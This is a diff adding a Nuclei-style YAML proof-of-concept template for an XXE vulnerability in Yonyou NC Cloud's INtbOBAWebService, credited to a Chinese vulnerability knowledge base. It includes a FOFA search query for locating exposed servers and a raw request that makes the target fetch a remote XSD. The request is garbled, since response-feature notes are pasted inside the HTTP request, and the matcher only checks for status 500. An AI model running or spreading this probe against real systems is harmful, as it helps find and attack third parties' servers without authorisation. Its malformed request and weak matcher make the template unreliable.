@@ -1,0 +1,49 @@
+id: poc-wfpzydz5lotb7eft
+info:
+  name: 用友NC Cloud INtbOBAWebService XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wfpzydz5lotb7eft'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wfpzydz5lotb7eft
+    fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+http:
+- raw:
+  - 'GET /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://www.baidu.com/win2.xml HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: text/plain, */*; q=0.01
+
+
+    Cache-Control: no-cache
+
+
+    Pragma: no-cache
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
